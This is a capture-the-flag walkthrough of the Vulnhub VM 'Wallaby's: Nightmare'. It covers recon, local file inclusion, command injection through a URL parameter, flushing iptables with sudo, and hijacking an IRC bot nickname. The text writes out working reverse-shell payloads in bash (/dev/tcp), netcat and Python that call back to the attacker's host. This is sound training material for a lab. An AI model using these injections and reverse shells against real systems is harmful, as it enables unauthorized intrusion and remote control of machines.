Wallaby's: Nightmare (1.0.2)
============================

Source: https://www.vulnhub.com/entry/wallabys-nightmare-102,176/

*  Name: Wallaby's: Nightmare
*  Released: 22 Dec 2016
*  Author: Waldo
*  Series: Wallaby's

Recon, Recon, Recon
-------------------

This VM was absolutely not connected to my network -- I set it on its own VLAN. As should you if you run any of these Vulnhub exercises.
I started by running a ping scan across my local `/16` to see what was open.

```
nmap -sn 192.168.0.0/16
```

That came up with 2 results for the VM:

```
map scan report for 192.168.xx.xx
Host is up (0.00040s latency).
MAC Address: 00:0C:29:6B:EE:FA (VMware)
Nmap scan report for 192.168.xx.xx
Host is up (0.00038s latency).
MAC Address: 00:0C:29:6B:EE:FA (VMware)
```

Well (alright)x3, we have our 2 IPs. Time for a bit of a juicier `nmap`:

```
nmap -sV -A --open -vv -p1-65535 $TARGETIPS

[insert brevity here]

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:07:fc:70:20:98:f8:46:e4:8d:2e:ca:39:22:c7:be (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRXjkewNllkNLo46qiVKISIdysX+C//dfiL0yrAphV9jJg7ETXmLIcfKGQIuRVWXRPm5LgX1OE4LP4wmc5qWbCrI9HOZNMDDuZZsJ7hsHhDPVfu9J0aGoj69vPo7FCZlNWd+371cUiI0qmUeOGZGfAmZotGPkW9r6lom2ww6JphrtwpmlyI+pQk2x1qZR4ZnCIl+XmgFyGHEhim5ALMplxQP8qjnxjncr90xYSByjtQjlvURlemFjjbvVpPhX+BzsMAsXO16ywClLoig0dU39sSBbCSkgmryJYyLfkSWVO9KV6HPEXrVVxnHmUPwi19xGBiq9mxUbmPIza9r0BEofl
|   256 99:46:05:e7:c2:ba:ce:06:c4:47:c8:4f:9f:58:4c:86 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE91a97Hjo/onlxZBy2uFVZ5oTYZcVW2ivqzxdbF0EANVVX5asJJWv3jnb0NQuZY0LqUEs3cObmDVrKETtWmDfw=
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Wallaby's Server
```

Both IPs have SSH and Apache 2.4.18 open, and the server looks to be Ubuntu.

App(le) Picking
---------------

Let's check out this web app! It asked me to create a username, and because I love FFXIV so much, I chose `y4nd3r3_ro3`. Once registered, it takes me to a URL with this format:

> http://192.168.xx.xx/?page=home

The "registration" page suggested fuzzing is the way to go, and I do love fuzzing. With a URL format like that, I tried the first thing that came to mind: LFI (Local File Inclusion). Since it's an Ubuntu server, I stuck with the standard `/etc/passwd` test...

> http://192.168.xx.xx/?page=../../../etc/passwd

...And it worked! 


```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false walfin:x:1000:1000:walfin,,,:/home/walfin:/bin/bash sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false steven?:x:1001:1001::/home/steven?:/bin/bash ircd:x:1003:1003:,,,:/home/ircd:/bin/bash
```

There are users named `steven?` and `walfin` in there, also an irc daemon. Both first users listed have `/bin/bash` enabled.

So let's try `/etc/shadow`...

> http://192.168.xx.xx/?page=../../etc/shadow

NOPE! I get this lovely message instead:

> That's some fishy stuff you're trying there y4nd3r3_ro3 buddy. You must think Wallaby codes like a monkey! I better get to 
> securing this SQLi though...

> (Wallaby caught you trying an LFI, you gotta be sneakier! Difficulty level has increased.)

And now the HTTP port has changed. :| 

It's ok, this is why I love `nmap` so much.

```
60080/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Wallaby's Server
```

Meanwhile, at http://192.168.xx.xx:60080/

> HOLY MOLY, this guy y4nd3r3_ro3 wants me...Glad I moved to a different port so I could work more securely!!!
>
> As we all know, security by obscurity is the way to go...

The previous LFI has been cleaned up, and directory listings are off. So where do I go from here? The VM's web app tends to generic 404 me when I do something like "index.html", same on generic PHP files like "home.php", but gives me a custom 404 page for anything formatted like "/?page=test.php". From here I assumed their script is looking for the "/?page=" appended onto the file, so I ran `dirb` to see if there's anything common I could find:

`dirb http://192.168.xx.xx:60080?page= /usr/share/wordlists/dirb/common.txt`

From here I got some interesting results:
 
``` 
+ http://192.168.xx.xx:60080?page=contact (CODE:200|SIZE:895)                                                                                                                   
+ http://192.168.xx.xx:60080?page=home (CODE:200|SIZE:1151)                                                                                                                     
+ http://192.168.xx.xx:60080?page=index (CODE:200|SIZE:1366)                                                                                                                    
+ http://192.168.xx.xx:60080?page=mailer (CODE:200|SIZE:1089) 
```

At "?page=mailer" I got some interesting results by looking at the page source:

```
<!--a href='/?page=mailer&mail=mail wallaby "message goes here"'><button type='button'>Sendmail</button-->
    <!--Better finish implementing this so y4nd3r3_ro3
 can send me all his loser complaints!-->
```

So, big ol' hint there to use `/?page=mailer&mail=mail wallaby "message goes here"` as a potentially sensitive URL format. 

Do As I Say, Not As I Do
-------------------------

I try this URL, nothing much happens:

http://192.168.xx.xx:60080/?page=mailer&mail=mail

But then I start poking around...

http://192.168.xx.xx:60080/?page=mailer&mail=pwd

> /var/www/html
> Coming Soon guys!

A little more...

http://192.168.xx.xx:60080/?page=mailer&mail=ls%20-lah

> total 96K drwxr-xr-x 3 www-data www-data 4.0K Jan 3 07:41 . drwxr-xr-x 3 root root 4.0K Dec 16 21:31 .. -rw-r--r-- 1 root 
> root 16K Aug 11 2015 eye.jpg -rw-r--r-- 1 root root 3.6K Dec 27 19:19 index.php drwxr-xr-x 2 root root 4.0K Dec 27 12:25 
> s13!34g$3FVA5e@ed -rw-r--r-- 1 root root 57K Dec 27 12:24 sec.png -rw-r--r-- 1 www-data www-data 12 Jan 3 07:26 uname.txt
> Coming Soon guys!

Running `cat /etc/passwd` gave us some different entries than pre-LFI reset:
*  `wallaby:x:1001:1001::/home/wallaby:/bin/bash`
*  `waldo:x:1000:1000:waldo,,,:/home/waldo:/bin/bash`

And while IRC is back, it now has an accompanying bot:

*  `ircd:x:1003:1003:,,,:/home/ircd:/bin/bash`
*  `sopel:x:110:118:Sopel IRC bot,,,:/var/lib/sopel:/bin/false`

But what is it listening on? I didn't see it on `nmap` earlier.

http://192.168.xx.xx:60080/?page=mailer&mail=netstat%20-tapln

```
Active Internet connections (servers and established) 
Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - 
tcp 0 0 0.0.0.0:6667 0.0.0.0:* LISTEN - 
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - 
tcp 0 0 127.0.0.1:43712 127.0.0.1:6667 ESTABLISHED - 
tcp 0 0 127.0.0.1:6667 127.0.0.1:43712 ESTABLISHED - 
tcp 0 0 127.0.0.1:6667 127.0.0.1:43708 ESTABLISHED - 
tcp 0 0 127.0.0.1:6667 127.0.0.1:43706 ESTABLISHED - 
tcp 0 0 127.0.0.1:43706 127.0.0.1:6667 ESTABLISHED - 
tcp 0 0 127.0.0.1:43708 127.0.0.1:6667 ESTABLISHED - 
tcp6 0 0 :::60080 :::* LISTEN - 
tcp6 0 0 :::22 :::* LISTEN - 
```

Hm, what's that on 6667? Time to find out.

http://192.168.xx.xx:60080/?page=mailer&mail=sudo%20iptables%20-nvL

```
Chain INPUT (policy ACCEPT 289K packets, 16M bytes) pkts bytes target prot opt in out source destination 
1001 64129 ACCEPT tcp -- * * 127.0.0.1 0.0.0.0/0 tcp dpt:6667 
19 948 DROP tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:6667 

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 

Chain OUTPUT (policy ACCEPT 292K packets, 24M bytes) pkts bytes target prot opt in out source destination
```

I will note that I am making a lot of assumptions at this point as to what this user has permissions to. That's just how my brain works: throwing spaghetti at walls.  From above, I see `iptables` is dropping all connections except those performed from inside the server. So now I have to get in the server. 

Sudo Make Me a User
-----------------------

It's time for `ncat`! ...Or not?

http://192.168.xx.xx:60080/?page=mailer&mail=nc%20-nvlp%204443%20-e%20/bin/bash
> How you gonna use netcat so obviously. Cmon man. This is all in the logs.

Alright, so I can't use `nc` or `ncat` or `netcat` in any incarnation. Thankfully, PentestMonkey has a writeup on how to do it with bash:

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

So, I've rewritten the above URL to be the following:

http://192.168.xx.xx:60080/?page=mailer&mail=bash%20-i%20%3E&%20/dev/tcp/10.0.0.1/4443%200%3E&1

This gives no output, so I tried in terminal, with no luck either. `iptables` is giving me issues. I can do commands in my browser though, right? So time to try that again...

http://192.168.xx.xx:60080/?page=mailer&mail=sudo%20iptables%20-F

Flushed the rules, and...

http://192.168.xx.xx:60080/?page=mailer&mail=sudo%20iptables%20-nvL

> Chain INPUT (policy ACCEPT 2 packets, 434 bytes) pkts bytes target prot opt in out source destination 
> Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 
> Chain OUTPUT (policy ACCEPT 1 packets, 866 bytes) pkts bytes target prot opt in out source destination 
> 
> Coming Soon guys!

Muahahaha. No more block on port 6667, either. 

I join the IRC server using HexChat (because I'm bad and can't ever remember Irssi configs). After listing channels, I see they have `wallabyschat` open, so I join it. `wallabysbot` is in there, which must be the Sopel bot listed as a user earlier in my findings.

```
* There are 1 users and 3 invisible on 1 servers
* 1 :channels formed
* I have 4 clients and 0 servers
* 4 4 :Current local users 4, max 4
* 4 4 :Current global users 4, max 4
* MOTD File is missing
* y4nd3r3_ro3 sets mode +i on y4nd3r3_ro3
* y4nd3r3_ro3 sets mode +w on y4nd3r3_ro3
* y4nd3r3_ro3 sets mode +x on y4nd3r3_ro3
```


```
<wallabysbot> You can see more info about any of these commands by doing .help <command> (e.g. .help time)
<wallabysbot> ADMIN         msg  part  me  save  quit  set  mode  join
<wallabysbot> ADMINCHANNEL  kickban  quiet  showmask  kick  topic  unquiet  ban
<wallabysbot>               tmask  unban
<wallabysbot> ANNOUNCE      announce
<wallabysbot> CORETASKS     blocks  useserviceauth
<wallabysbot> HELP          help
<wallabysbot> RUN           run

<y4nd3r3_ro3> .run
<wallabysbot> Hold on, you aren't Waldo?
```

I have to be the Waldo. Self-actualization aside, it's looking for me to have Waldo as my nick.

Combining information gathered earlier, and my `iptables` access:

*  `waldo:x:1000:1000:waldo,,,:/home/waldo:/bin/bash`
*  `ESTABLISHED - tcp 0 0 127.0.0.1:6667 127.0.0.1:43708`

I'm going to try to block any internal VM connections to IRC. Yes, I had to look this up, this is how we learn. It also wasn't in the `man` page.

https://www.linux-noob.com/forums/index.php?/topic/1180-how-to-block-local-users-ports-and-ips/ (don't hate me)

So, time to write a rule:

http://192.168.xx.xx:60080/?page=mailer&mail=sudo%20iptables%20-t%20filter%20-A%20OUTPUT%20-p%20tcp%20--dport%206667%20--match%20owner%20--uid-owner%201000%20-j%20DROP

Testing to make sure it sticks:

http://192.168.xx.xx:60080/?page=mailer&mail=sudo%20iptables%20-nvL

```
Chain INPUT (policy ACCEPT 35 packets, 2729 bytes) pkts bytes target prot opt in out source destination 
Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 
Chain OUTPUT (policy ACCEPT 84 packets, 6484 bytes) pkts bytes target prot opt in out source destination 
50 5115 DROP tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:6667 owner UID match 1000 
```

Great success. Now to wait for `waldo` to time out of the IRC room and snipe the login.

`* waldo has quit (Ping timeout: 188 seconds)`

[insert HexChat settings tomfoolery here]

```
* waldo sets mode +i on waldo
* waldo sets mode +w on waldo
* waldo sets mode +x on waldo
```

```
<waldo> .run
<wallabysbot> FileNotFoundError: [Errno 2] No such file or directory: 'None' (file "/usr/lib/python3.5/subprocess.py", line 1551, in _execute_child)
```

Aha, it's a Python bot. Time to see what I can do now that I'm `waldo` through a surrogate!

Sopel is My Friend
------------------

In using the bot, I find some difficulty with running bash or Python commands. They're all erroring out, and I'm starting to think it's the bot itself. I can do simple commands like `whoami` and `pwd` but it can't execute past that.

```
<wallabysbot> FileNotFoundError: [Errno 2] No such file or directory: 'python -c \'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.xx.xx",4443));os.dup2(s.fileno(),
); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' (file
"/usr/lib/python3.5/subprocess.py", line 1551, in _execute_child)
```
